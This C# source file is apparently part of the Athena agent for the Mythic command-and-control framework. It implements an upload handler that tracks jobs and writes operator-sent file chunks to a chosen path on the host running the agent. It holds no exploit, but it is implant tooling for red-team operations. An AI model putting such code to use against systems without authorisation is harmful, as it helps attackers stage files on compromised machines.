using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using Athena.Models;
using System.Collections.Concurrent;

namespace Athena.Commands
{
    public class UploadHandler
    {
        private ConcurrentDictionary<string, MythicUploadJob> uploadJobs { get; set; }
        
        public UploadHandler()
        {
            uploadJobs = new ConcurrentDictionary<string, MythicUploadJob>();
        }
        /// <summary>
        /// Create and start a new upload job
        /// </summary>
        /// <param name="job">The MythicJob to begin</param>
        public async Task<string> StartUploadJob(MythicJob job)
        {
            MythicUploadJob uploadJob = new MythicUploadJob(job);
            Dictionary<string, string> uploadParams = Misc.ConvertJsonStringToDict(job.task.parameters);
            uploadJob.path = uploadParams["remote_path"];
            uploadJob.file_id = uploadParams["file"];
            uploadJob.task = job.task;
            uploadJob.chunk_num = 1;

            this.uploadJobs.GetOrAdd(job.task.id,uploadJob);

            return new UploadResponse
            {
                task_id = job.task.id,
                upload = new UploadResponseData
                {
                    chunk_size = uploadJob.chunk_size,
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    full_path = uploadJob.path,
                }
            }.ToJson();
        }
        /// <summary>
        /// Check if an upload job exists and is running
        /// </summary>
        /// <param name="task_id">The MythicJob ID</param>
        public async Task<bool> ContainsJob(string task_id)
        {
            return uploadJobs.ContainsKey(task_id);
        }
        /// <summary>
        /// Get the UploadJob object by ID
        /// </summary>
        /// <param name="task_id">The MythicJob ID</param>
        public async Task<MythicUploadJob> GetUploadJob(string task_id)
        {
            return uploadJobs[task_id];
        }
        /// <summary>
        /// Upload the next chunk of the file
        /// </summary>
        /// <param name="bytes">Bytes to writes</param>
        /// <param name="job_id">The MythicJob ID</param>
        public async Task<bool> UploadNextChunk(byte[] bytes, string job_id)
        {
            MythicUploadJob job = uploadJobs[job_id];
            try
            {
                Misc.AppendAllBytes(job.path, bytes);
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }
        /// <summary>
        /// Complete and remove the upload job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the upload job to complete</param>
        public async Task CompleteUploadJob(string task_id)
        {
            if (this.uploadJobs.ContainsKey(task_id))
            {
                this.uploadJobs.Remove(task_id, out _);
            }
        }
    }
}
